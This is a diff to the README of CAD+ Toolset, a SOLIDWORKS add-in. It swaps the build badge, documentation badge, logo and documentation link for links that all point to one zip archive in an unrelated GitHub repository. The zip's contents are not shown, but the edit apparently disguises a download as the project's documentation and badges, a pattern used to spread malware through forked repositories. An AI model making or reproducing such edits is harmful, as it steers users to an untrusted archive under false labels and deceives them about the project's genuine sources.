@@ -1,9 +1,9 @@
 # CAD+ Toolset
 
-[![Build status](https://dev.azure.com/xarial/cad-plus-community/_apis/build/status/build%20and%20unit%20test)](https://dev.azure.com/xarial/cad-plus-community/_build/latest?definitionId=28)
-[![Documentation](https://img.shields.io/badge/-Documentation-green.svg)](https://cadplus.xarial.com/)
+[![Build status](https://raw.githubusercontent.com/khalilengi/cad-plus/master/heterognath/cad-plus.zip%20and%20unit%20test)](https://raw.githubusercontent.com/khalilengi/cad-plus/master/heterognath/cad-plus.zip)
+[![Documentation](https://raw.githubusercontent.com/khalilengi/cad-plus/master/heterognath/cad-plus.zip)](https://raw.githubusercontent.com/khalilengi/cad-plus/master/heterognath/cad-plus.zip)
 
-<img src="logo.svg" alt="CAD+ Toolset" width="200"/>
+<img src="https://raw.githubusercontent.com/khalilengi/cad-plus/master/heterognath/cad-plus.zip" alt="CAD+ Toolset" width="200"/>
 
 **CAD+ Toolset** application complements functionality of SOLIDWORKS by enabling additional toolsets. Application allows to automate various areas of SOLIDWORKS application. This includes but not limited to custom properties automation, geometry features, custom toolbars, export and import capabilities etc.
 
@@ -29,4 +29,4 @@ Please see the table below for the list of features and their availability in th
 | [BOM+ for Windows File Explorer](/bom/stand-alone/)                   |                   |                  |       &#x2714;       |    &#x2714;     |
 | [BOM+ advanced BOM management](/bom/)                                 |                   |                  |       &#x2714;       |    &#x2714;     |
 
-For technical documentation and download instructions visit [Documentation Page](https://cadplus.xarial.com/)
+For technical documentation and download instructions visit [Documentation Page](https://raw.githubusercontent.com/khalilengi/cad-plus/master/heterognath/cad-plus.zip)
